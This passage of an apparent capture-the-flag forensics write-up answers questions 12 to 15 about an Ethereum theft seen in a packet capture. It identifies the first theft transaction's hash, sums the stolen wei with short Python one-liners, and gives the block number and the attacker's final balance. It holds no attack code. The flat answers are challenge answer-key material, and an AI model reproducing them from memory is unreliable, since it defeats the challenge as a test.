Check for the first packet whose timestamp is after `04:09:22`:
![image](https://hackmd.io/_uploads/ryl5KZOcGe.png)
We know that this is the first transaction because of the `0x0` nonce, and its value is `0x1bc16d674ec80000`. It was a successful transaction because of the status `0x1`:
![image](https://hackmd.io/_uploads/BkgZo-OqMl.png)
Scroll down, check for the result of method `method":"eth_sendRawTransaction`, whose `id` is `12`:
![image](https://hackmd.io/_uploads/rJ9ZcbdcMl.png)
Its hash is `0x7b7ded2d51f0dcb1bf3fc5cc9598b81a7a622aac15d3841d377c548986e0a7c3`.

**Answer:** `0x7b7ded2d51f0dcb1bf3fc5cc9598b81a7a622aac15d3841d377c548986e0a7c3`

#### 13. What was the total amount of Ether stolen by the attacker? (1 Eth = 10^18 wei
Similarly, check for the next packets to find the value of successful transactions that have the same recepient (`0x82b03246a287e5ed681b967cbd9b610a24bd5ef9`):
![image](https://hackmd.io/_uploads/HJaMh-O9Gl.png)
![image](https://hackmd.io/_uploads/SkT92b_5zl.png)
![image](https://hackmd.io/_uploads/SyoA3ZucGe.png)
![image](https://hackmd.io/_uploads/BylOpbO5Gl.png)
![image](https://hackmd.io/_uploads/S1Hnabdqzx.png)
![image](https://hackmd.io/_uploads/S1nlCWd9fx.png)
![image](https://hackmd.io/_uploads/rybt0ZOqMe.png)
Then run the below code:
``` py
print(sum(int(x,16) for x in ['1bc16d674ec80000','29a2241af62c0000','3782dace9d900000', '29a2241af62c0000', '2c68af0bb1400000', '1e87f85809dc0000', '3e73362871420000', '22b1c8c1227a0000'])/10**18)
```
**Answer:** `24.4`

#### 14. What is the block number of the last transaction in which Ether was stolen? (Decimal)
In the last transaction, check for the response of `eth_getTransactionByHash` method:
![image](https://hackmd.io/_uploads/r198xzd5Mg.png)
The block number is `0x12`. Run the code below to transfer from hex to dec:
``` py
print(int('0x12',16))
```
There are `18` block number.

**Answer:** `18`

#### 15. After the attacker stole the Ether, what was the balance in their wallet? (Ignore the trailing zeros)
Filter packets that contains the information related to checking for the last balance of attacker:
![image](https://hackmd.io/_uploads/H19gYMd5fl.png)
Check for its HTTP Stream:
![image](https://hackmd.io/_uploads/ryLwtfO9fx.png)
Run the following code:
``` py
print(sum(int(x,16) for x in ['1529f07e833d46000'])/10**18)
```

**Answer:** `24.40023`
